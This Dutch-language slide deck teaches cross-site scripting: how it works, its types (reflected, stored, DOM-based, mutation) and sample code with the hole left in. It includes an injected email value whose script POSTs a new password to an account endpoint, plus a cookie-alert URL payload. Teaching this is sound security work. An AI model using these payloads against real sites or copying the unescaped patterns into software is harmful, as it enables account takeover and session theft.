!SLIDE image
# Werking #

![rendering](rendering.jpg)

    @@@php
    <i><?php print $email ?></i>

!SLIDE code

    @@@html
    ber@berk.es</i><script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/account", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("password=compromised");
    </script><i>

!SLIDE bullets incremental
# Werking #

* Injecteer scripts of andere ongewenste content.

!SLIDE center
<iframe width="960" height="720" src="//www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0" frameborder="0" allowfullscreen></iframe>

!SLIDE bullets incremental
# Soorten #

* Reflected, None-persistent XSS
* Stored, Persistent XSS
* DOM based XSS
* mXSS of mutation XSS

!SLIDE
# Reflected #

    @@@ruby
    "Please check the confirmation at %{email}"

!SLIDE
# Stored #

    @@@ruby
    msg = "Users with changed emails:<br>"
    User.updated(2.days.ago).each do |user|
      msg += "* %{user.email}<br>"
    end

!SLIDE
# DOM based #

    @@@HTML
    <select><script>
    document.write("<OPTION value=1>"
      +document.location.href.substring(
        document.location.href.indexOf("default=")
      +8)+"</OPTION>");
    document.write("<OPTION value=2>English</OPTION>");
    </script></select>

Normaal aangeroepen met: `http://www.some.site/page.html?default=French`

Nu aangeroepen met: `http://www.some.site/page.html?default=<script>alert(document.cookie)</script>`

!SLIDE image
# mXSS mutation XSS #
![Einde der tijden](laatste_oordeel.jpg)

* Gebruikt innerHTML om ge-escapete code te ont-escapen.
* Alle Browserbouwers gingen al de mist in.
* Extra voorzichtig met WYSIWYG-editors, SVG, MathML en CDATA.
